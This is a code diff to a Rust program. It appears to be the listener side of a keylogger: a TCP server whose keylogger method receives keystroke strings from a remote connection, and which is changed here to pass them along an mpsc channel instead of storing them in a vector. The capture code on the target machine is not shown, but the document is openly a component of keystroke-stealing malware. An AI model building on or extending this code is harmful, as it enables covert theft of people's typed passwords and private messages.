@@ -1,10 +1,10 @@
 use std::io::prelude::*;
 use std::net::{TcpListener, TcpStream, SocketAddr};
+use std::sync::mpsc;
 
 pub struct Core {
     stream: TcpStream,
     pub addr: SocketAddr,
-    pub keys: Vec<String>,
 }
 
 impl Core {
@@ -15,12 +15,9 @@ impl Core {
             .accept()
             .unwrap();
 
-        let keys = Vec::new();
-
         Core {
             stream,
             addr,
-            keys,
         }
     }
 
@@ -30,7 +27,7 @@ impl Core {
         Ok(())
     }
 
-    pub fn keylogger(&mut self) {
+    pub fn keylogger(&mut self, sender: mpsc::Sender<String>) {
         let mut buffer = [0; 512];
 
         while let Ok(bytes) = self.stream.read(&mut buffer[..]) { 
@@ -39,7 +36,9 @@ impl Core {
             }
 
             if let Ok(key) = std::str::from_utf8(&buffer[..bytes]) {
-                self.keys.push(key.to_string());
+                if sender.send(key.to_string()).is_err() {
+                    break;
+                }
             }
         }
     }
